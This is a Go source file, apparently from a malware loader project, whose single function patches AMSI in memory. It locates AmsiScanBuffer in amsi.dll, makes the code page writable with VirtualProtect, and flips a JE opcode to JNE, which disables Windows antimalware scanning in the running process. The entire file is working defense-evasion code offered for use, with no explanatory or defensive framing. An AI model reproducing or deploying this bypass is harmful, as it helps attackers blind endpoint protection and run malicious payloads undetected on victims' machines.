package bypass

import (
	"log"
	"syscall"
	"unsafe"

	"github.com/mszatanik/goloader/pkg/win32"
)

func Patch_AmsiScanBuffer() {
	log.Println("[*] attepmting to patch AMSI")

	var (
		px74Opcode                  uintptr = 0
		i                           uintptr = 0
		oldprotect                  uintptr = 0
		x64_RET_INSTRUCTION_OPCODE  byte    = 0xC3
		x64_INT3_INSTRUCTION_OPCODE byte    = 0xCC
		x64_JE_INSTRUCTION_OPCODE   byte    = 0x74
		x64_JNE_INSTRUCTION_OPCODE  byte    = 0x75
	)

	hAmsi, err := syscall.LoadLibrary("amsi")
	if err != nil {
		log.Fatalln("[-] can't load amsi", err)
	}

	AmsiScanBuffer, err := syscall.GetProcAddress(syscall.Handle(hAmsi), "AmsiScanBuffer")
	if err != nil {
		log.Fatalln("[-] can't load AmsiScanBuffer", err)
	}
	pAmsiScanBuffer := unsafe.Pointer(AmsiScanBuffer)

	// looking for last ret
	log.Println("[*] looking for last ret starting from: ", uintptr(pAmsiScanBuffer))
	for {
		if *(*byte)(unsafe.Pointer(uintptr(pAmsiScanBuffer) + i)) == x64_RET_INSTRUCTION_OPCODE &&
			*(*byte)(unsafe.Pointer(uintptr(pAmsiScanBuffer) + i + 1)) == x64_INT3_INSTRUCTION_OPCODE &&
			*(*byte)(unsafe.Pointer(uintptr(pAmsiScanBuffer) + i + 2)) == x64_INT3_INSTRUCTION_OPCODE {
			log.Println("[+] found 0xC3 0xCC 0xCC at: ", i, uintptr(pAmsiScanBuffer)+i)
			break
		}
		i++
	}

	// looking for last je
	log.Println("[*] looking for last je going back from: ", i, uintptr(pAmsiScanBuffer)+i)
	for {
		addr := uintptr(pAmsiScanBuffer) + i
		value := *(*byte)(unsafe.Pointer(addr))
		if value == x64_JE_INSTRUCTION_OPCODE {
			px74Opcode = addr
			log.Println("[+] found 0x74 at: ", uintptr(px74Opcode))
			break
		}
		i--
	}

	if px74Opcode == 0 {
		log.Fatalln("[-] px74Opcode is nil")
	}

	log.Printf("[*] setting protection of: %d to: PAGE_EXECUTE_READWRITE\r\n", px74Opcode)
	err = win32.VirtualProtectCall(
		px74Opcode,
		0x01,
		win32.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if err != nil {
		log.Fatalln("[-] VirtualProtectCall failed", err)
	}

	// patch
	log.Printf("[*] patching AMSI at %d with %b\r\n", px74Opcode, x64_JNE_INSTRUCTION_OPCODE)
	ptr := (*byte)(unsafe.Pointer(px74Opcode)) // Convert the address to a pointer of appropriate type using unsafe.Pointer
	*ptr = x64_JNE_INSTRUCTION_OPCODE          // Assign the new value through the pointer

	log.Printf("[*] setting protection of: %d to: %d\r\n", px74Opcode, oldprotect)
	win32.VirtualProtectCall(
		px74Opcode,
		0x01,
		oldprotect,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if err != nil {
		log.Fatalln("[-] VirtualProtectCall failed", err)
	}

	log.Println("[+] AMSI patched")
}
